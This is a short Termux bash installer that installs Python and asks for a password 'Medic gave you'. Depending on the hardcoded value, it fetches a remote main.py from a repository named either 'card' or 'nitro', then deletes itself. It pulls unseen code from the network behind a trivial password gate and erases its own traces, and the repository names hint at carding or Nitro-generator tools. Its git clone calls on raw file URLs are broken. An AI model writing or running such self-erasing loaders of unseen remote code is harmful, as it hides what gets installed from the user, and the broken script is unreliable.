#!/data/data/com.termux/files/usr/bin/bash

pkg update
pkg install -y python
pkg install -y python-pip

read -p "Enter the password Medic gave you: " password

if [[ "$password" == "123" ]]; then
    git clone https://raw.githubusercontent.com/medic2227/card/main/main.py
elif [[ "$password" == "321" ]]; then
    git clone https://raw.githubusercontent.com/medic2227/nitro/main/main.py
else
    echo "Invalid password. Exiting."
    exit 1
fi

rm -- "$0"
